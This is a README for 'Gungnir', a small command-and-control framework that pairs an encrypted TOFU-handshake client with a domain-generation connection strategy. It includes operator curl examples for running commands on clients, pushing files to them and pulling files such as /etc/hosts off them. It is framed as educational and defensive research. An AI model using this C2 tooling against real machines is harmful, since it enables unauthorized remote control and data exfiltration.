> **Warning**
> This project is for educational and defensive research purposes only. The code contains intentional limitations and vulnerabilities and is not intended for production use.

# Gungnir

Gungnir is a minimal remote command and control system. A central
server accepts TCP connections from clients over an authenticated and encrypted
channel and exposes a JSON HTTP API for operators. Clients authenticate using a
trust-on-first-use (TOFU) handshake and exchange JSON messages.

## Features

- **JSON protocol** – Messages are framed as length-prefixed JSON structures for
  commands, file transfer and pings
- **NaCl `box` encryption** – Clients and server establish a shared key during a
  TOFU handshake and encrypt all traffic with NaCl's `box` primitive
- **HTTP control API** – The server exposes endpoints to list clients, send
  commands, transfer files and rotate keys

### Kill switch

The client implements a simple autokill mechanism. When it starts, it looks
for a file named `.gungnir` in the current user's home directory. If this file
is present, the client exits immediately.

## Handshake

### 1. Initial handshake

1. **Server starts** with an in-memory X25519 key pair (`serverPub`, `serverSec`).
2. **Client generates** an ephemeral pair (`clientPub`, `clientSec`).
3. **Hello →** Client sends `[OpHello][clientPub]`.
4. **HelloReply ←** Server replies with `[OpHelloReply][serverPub]`.
5. **TOFU (Trust On First Use)**
   - If the client already saved a pin for `serverPub`, compare:
     - match → continue.
     - mismatch → fail (possible MitM).
   - If no pin exists, save `serverPub` to `~/.ssh/g_server.hex` with mode `600`.
6. **Shared secret**
   - Both sides run `box.Precompute` with the received public key and their secret key.
   - The result (`shared`) is used with AEAD (`box.SealAfterPrecomputation`).
7. **Session established**
   - From this point, all traffic is encrypted frame by frame (`WriteMsg`/`ReadMsg`).

### 2. Framing and AEAD

Each message in the session is wrapped in an “envelope” with three parts:

1. **4-byte prefix**

   * A `uint32` integer in big-endian order.
   * Holds the size of the **already encrypted** payload.
   * Allows the receiver to know exactly how many bytes to read from the socket before calling the decryptor.

2. **24-byte nonce**

   * Not secret, sent along with the frame.
   * Encodes two things:

     * **Direction**: whether it came from client → server or server → client (a fixed bit or byte).
     * **Monotonic counter**: incremented for each message sent in that direction.
   * Ensures uniqueness: the same nonce must never be reused within a session.

3. **Encrypted payload**

   * The original data (JSON, command, file, etc.) encrypted with `box.SealAfterPrecomputation`.
   * This call uses the *shared key* derived during the handshake and the frame’s nonce.
   * Produces `ciphertext + MAC`.

This provides:

- **Confidentiality**

   * Without the shared secret key, the encrypted payload is pure gibberish.
   * Even if an attacker captures the packets, they can’t read the contents.

- **Integrity (MAC)**

   * `SealAfterPrecomputation` includes a message authenticator.
   * If the payload is tampered with, verification fails and the frame is rejected.

- **Replay protection**

   * The monotonic counter ensures each nonce is unique.
   * If someone tries to resend a previously seen frame, the repeated nonce gives it away.
   * You can immediately discard packets with counters lower than or equal to the last accepted.

### 3. Rekey with OpReset

When the server decides to rotate keys:

1. **Server generates** a new pair: `newPub`, `newSec`.
2. **Server broadcasts** to all clients:
   ```json
   { "Type": "secure_reset", "ID": "<fingerprint>", "Data": <newPub (32 bytes)> }
   ```
3. **Client on receipt**:
   - Recomputes the shared secret with `newPub`.
   - Updates the pin stored in `~/.ssh/g_server.hex`.
   - Responds with ACK:
     ```json
     { "Type": "secure_reset_ack", "ID": "<fingerprint>" }
     ```
4. **Server on ACK**:
   - Applies `RekeyServer` for that session, switching `shared` to `newSec`.
   - Clears `pendingPub`/`pendingSec`.
5. **Result**: traffic resumes encrypted with the new keys and the client pin is updated.

## Security implications

* An attacker intercepting the **first connection** can supply a fake key and maintain a MitM indefinitely.
* The pin file (`~/.ssh/g_server.hex`) is a target; if compromised or corrupted, the client may accept malicious keys or fail to connect.
* Lack of forward secrecy between resets means that if the shared key is exposed, previously captured traffic can be decrypted.
* Nonce reuse or counter failures can break the confidentiality provided by AEAD.
* Clients blindly trust any reachable server. Each build injects a random BuildID into the server and client binaries, and the client only proceeds if the server presents the same ID. This prevents accidental mismatches, yet if an attacker alters the BuildID embedded in the client it can still be hijacked by a rogue server.

## Building

```sh
make
```

Individual components can be built separately:

```sh
make server   # builds bin/server
make client   # builds bin/client
```

## Running

### Server

The server listens on a TCP socket for client sessions and serves an HTTP API.
Addresses can be configured via environment variables:

- `SOCK_ADDR` (default `:9000`) – TCP listener for secure sessions
- `HTTP_ADDR` (default `:8080`) – HTTP API address

Example:

```sh
SOCK_ADDR=":9000" HTTP_ADDR=":8080" ./bin/server
```

### Client

Clients connect to the server, perform the TOFU handshake and register with a
combined identifier. Optionally supply a custom id:

```sh
./bin/client -id my-client
```

#### Connection strategy

The client iterates over the pseudo-random `host:port` pairs produced by
`GenDomainsStream` until a connection succeeds. Generated names may include
optional subdomains, vary TLDs, and use ports between `4000` and `9009`. The
stream uses a seed (default `23`) that can be overridden at build time by
providing a custom `SEED` variable to the `Makefile`. The generator stops after
ten minutes before starting over.


## HTTP API examples

Interact with the server's HTTP API using `curl`.

List connected clients:

```sh
curl http://localhost:8080/clients
```

Send a command to a specific client:

```sh
curl -X POST http://localhost:8080/send-cmd \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>","command":"whoami"}'
```
Ping a specific client:

```sh
curl -X POST http://localhost:8080/ping \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>"}'
```

Request basic info from a specific client:

```sh
curl -X POST http://localhost:8080/info \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>"}'
```

Ban a specific client:

```sh
curl -X POST http://localhost:8080/ban-client \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>"}'
```

Request info from all clients:

```sh
curl -X POST http://localhost:8080/info \
  -H 'Content-Type: application/json' \
  -d '{}'
```


Broadcast a command to all clients:

```sh
curl -X POST http://localhost:8080/send-cmd \
  -H 'Content-Type: application/json' \
  -d '{"command":"uptime"}'
```
Broadcast a ping to all clients:

```sh
curl -X POST http://localhost:8080/ping \
  -H 'Content-Type: application/json' \
  -d '{}'
```


Push a file to a client:

```sh
curl -X POST http://localhost:8080/send-file \
  -F client_id=<id> \
  -F path=/tmp/hello.txt \
  -F file=@hello.txt
```

Pull a file from a client:

```sh
curl -X POST http://localhost:8080/pull-file \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>","src_path":"/etc/hosts","dst_path":"hosts-copy"}'
```

Rotate keys for all clients:

```sh
curl -X POST http://localhost:8080/rotate-keys
```

Generate deterministic domain list:

```sh
curl -X POST http://localhost:8080/gen-domains \
  -H 'Content-Type: application/json' \
  -d '{"seed":23,"length":8,"total":3}'
```


## Testing

Run the full test suite with:

```sh
go test ./...
```

## Disclaimer and Legal Implications

Gungnir is provided for educational and defensive research purposes only. Use of
this software to access or control systems without explicit authorization may
violate local, state, and federal laws. The authors and contributors assume no
liability for misuse or damages resulting from the use of this project. Always
obtain proper consent before deploying Gungnir and ensure compliance with all
applicable regulations.

## License

This project is licensed under the terms of the MIT License. See [LICENSE](LICENSE).

